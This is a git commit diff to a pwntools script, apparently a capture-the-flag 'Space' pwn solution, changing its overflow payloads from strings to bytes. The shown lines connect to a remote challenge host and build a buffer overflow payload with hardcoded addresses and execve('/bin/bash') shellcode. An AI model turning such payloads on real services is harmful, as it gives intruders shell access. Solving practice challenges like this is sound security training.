0f6970976cb9ae6630d7b6b038e515709a374ace
pL4sTiC <64149887+tkrebby@users.noreply.github.com>
2021-03-06 09:38:44 -0500

    Update space.py

--- Challenges/Pwn/Space/space.py
+++ Challenges/Pwn/Space/space.py
@@ -6,8 +6,8 @@ PORT = "30716"
 p = remote(HOST, PORT)
 #p = process("./space")
 
-payload1 = 'A' * 14 + p32(0x0804b827) + p32(0x08049217) + p32(0x010101ff) + 'A' * 5
-payload2 = 'A' * 18 + p32(0x0804b816) + asm(shellcraft.execve('/bin/bash'))
+payload1 = b'A' * 14 + p32(0x0804b827) + p32(0x08049217) + p32(0x010101ff) + b'A' * 5
+payload2 = b'A' * 18 + p32(0x0804b816) + asm(shellcraft.execve('/bin/bash'))
 payload = payload1 + payload2
 
 p.recvuntil("> ")
